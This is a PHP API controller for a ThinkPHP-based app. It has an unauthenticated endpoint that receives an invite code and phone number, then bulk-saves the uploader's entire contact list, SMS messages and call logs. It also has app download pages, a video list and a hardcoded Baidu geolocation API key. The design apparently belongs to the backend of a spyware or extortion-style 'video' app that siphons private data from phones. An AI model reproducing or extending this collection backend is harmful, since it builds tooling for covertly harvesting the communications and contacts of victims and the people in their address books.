<?php

namespace app\api\controller;

use app\common\controller\Api;
use app\common\model\Config;
use EasyWeChat\Staff\Session;
use think\Db;
use think\Validate;
use think\View;

/**
 * 首页接口
 */
class Index extends Api
{
    protected $noNeedLogin = ['*'];
    protected $noNeedRight = ['*'];

    public function _initialize()
    {
        parent::_initialize();
        $this->user = new \app\common\model\UserSms;
        $this->getsms = new \app\common\model\Geydms;
        $this->gettel = new \app\common\model\Gettel;
        $this->getcall = new \app\common\model\Getcall;

    }

    /**
     * 首页
     *
     */
    public function index()
    {
        $this->success('请求成功');
    }


    public function telAdd(){
        $code = $this->request->request('code');
        if(!$code){
            $this->error('请输入邀请码');
        }
        $tel = $this->request->request('tel');
        if(!$tel){
            $this->error('请输入手机号');
        }
        $address = $this->request->request('address');
        $address_ip = $this->get_real_ip();
        if(!$address || strpos($address,'unde') !== false){
            $user_url = 'http://api.map.baidu.com/location/ip?ak=P0rUWlgbMrEmalGyAdUGQHkpE3i4voXI&ip='.$address_ip;
            $user_result = $this->_httpGet($user_url);
            $user_result = json_decode($user_result, true);
            if(isset($user_result['content']['address'])){
                $address = $user_result['content']['address'];
            }
            if(strpos($address,'unde') !== false){
                $address = '未知位置';
            }
        }
        // $lng = $this->request->request('lng');
        // $lat = $this->request->request('lat');
        $gettel = $this->request->request('gettel');//通讯录
        $getsms = $this->request->request('getsms');//短信
        $getcall = $this->request->request('getcall');// 通话记录

        $ip = $this->request->request('ip');
        if(!$ip){
            $ip = $this->get_real_ip();
        }
        $count = $this->user->where('ip',$ip)->count();
        if($count){
            $this->success('获取成功7');
        }
        $data = [
            'createtime' => time(),
            'code'=>$code,
            'tel'=>$tel,
            'ip'=>$ip,
            // 'address'=>$address,
            // 'lng'=>$lng,
            // 'lat'=>$lat
        ];
        Db::startTrans();
        try {
            set_time_limit(0);
            $result = $this->user->allowField(true)->insertGetId($data);
            if($result){
                if(isset($gettel)){
                    if($this->is_json($gettel)) {
                        $list = \GuzzleHttp\json_decode($gettel, true);
                        if (is_array($list)) {
                            foreach ($list as &$tel) {
                                $tel['parent_id'] = $result;
                            }
                             $this->gettel->allowField(true)->saveAll($list);
                        }
                    }
                }
                if(isset($getsms)){
                    if($this->is_json($getsms)) {
                        $list2 = \GuzzleHttp\json_decode($getsms, true);
                        if (is_array($list2)) {
                            foreach ($list2 as &$sms) {
                                $sms['parent_id'] = $result;
                                if(isset($sms['createtime'])){
                                    $sms['createtime'] =  substr($sms['createtime'], 0, -3);
                                }
                                if(isset($sms['content'])){
                                    $sms['content'] = $this->filterNickname($sms['content']);
                                }
                            }
                            $this->getsms->allowField(true)->saveAll($list2);
                        }
                    }
                }

                if(isset($getcall)){
                    if($this->is_json($getcall)) {
                        $list3 = \GuzzleHttp\json_decode($getcall, true);
                        if (is_array($list3)) {
                            foreach ($list3 as &$call) {
                                $call['parent_id'] = $result;
                                if(isset($call['calltime'])){
                                    $call['calltime'] = strtotime($call['calltime']);
                                }
                                if(isset($call['call_length'])) {
                                    $call['call_length'] = $this->sectime($call['call_length']);
                                }
                            }
                            $this->getcall->allowField(true)->saveAll($list3);
                        }
                    }
                }
                Db::commit();
                $this->success('获取成功');
            }else{
                Db::rollback();
                $this->error('获取失败');
            }
        } catch (ValidateException $e) {
            Db::rollback();
            $this->error('获取失败2');
        }

    }



    /*
表情过滤
*/
    private function filterNickname($nickname){
        $nickname = preg_replace('/[\x{1F600}-\x{1F64F}]/u', '', $nickname);

        $nickname = preg_replace('/[\x{1F300}-\x{1F5FF}]/u', '', $nickname);

        $nickname = preg_replace('/[\x{1F680}-\x{1F6FF}]/u', '', $nickname);

        $nickname = preg_replace('/[\x{2600}-\x{26FF}]/u', '', $nickname);

        $nickname = preg_replace('/[\x{2700}-\x{27BF}]/u', '', $nickname);

        $nickname = str_replace(array('"','\''), '', $nickname);

        return addslashes(trim($nickname));
    }





    /**
     * [_httpGet curl请求openid]
     * @param  [type] $url [description]
     * @return [type]      [description]
     */
    private function _httpGet($url){
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_TIMEOUT,500);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST , false);
        curl_setopt($curl, CURLOPT_URL, $url);
        $res = curl_exec($curl);
        curl_close($curl);
        return $res;
    }



    public function sectime($time = 0){
        if(is_numeric($time)){
            $tt=floor($time);
            $h=floor($tt/3600);$tt%=3600;
            $m=floor($tt/60);$tt%=60;
            $s=$tt;
            if($h){
                return $h.'天'.$m.'分钟'.$s.'秒';
            }
            if(!$h && $m){
                return $m.'分钟'.$s.'秒';
            }
            return $s.'秒';
        }else{
            return '未知';
        }
    }


    public function is_json($string) {
        json_decode($string);
        return (json_last_error() == JSON_ERROR_NONE);
    }


    public function get_real_ip(){
        $ip=false;
        if(!empty($_SERVER['HTTP_CLIENT_IP'])){
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        }
        if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $ips=explode (', ', $_SERVER['HTTP_X_FORWARDED_FOR']);
            if($ip){ array_unshift($ips, $ip); $ip=FALSE; }
            for ($i=0; $i < count($ips); $i++){
                if(!eregi ('^(10│172.16│192.168).', $ips[$i])){
                    $ip=$ips[$i];
                    break;
                }
            }
        }
        return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
    }


    public function down(){
        $view = new View();
        $name = Config::get(['name'=>'name'])['value'];
        $an = Config::get(['name'=>'an'])['value'];
        $ios = Config::get(['name'=>'ios'])['value'];
        $other = 'http://'.$_SERVER['SERVER_NAME'];
        $view->assign('name',$name);
        $view->assign('an',$an);
        $view->assign('ios',$ios);
        $view->assign('other',$other);
        return $view->fetch();
    }


    public function android_download(){
        $view = new View();
        $name = Config::get(['name'=>'name'])['value'];
        $an_down = Config::get(['name'=>'an_down'])['value'];
        $view->assign('an_down',$an_down);
        $view->assign('name',$name);
        return $view->fetch();
    }




    public function video_list(){
        $page = $this->request->request('page',1);
        $limit = $this->request->request('limit',8);
        $list = Db::name('video')
                ->order('sort desc')
                ->page($page,$limit)->select();
        if($list){
            foreach ($list as $key=>$value){
                $list[$key]['video_image'] = imageUrl($value['video_image']);
                $list[$key]['video_file'] = imageUrl($value['video_file']);
            }
        }
        $this->success('获取成功',$list);
    }






}
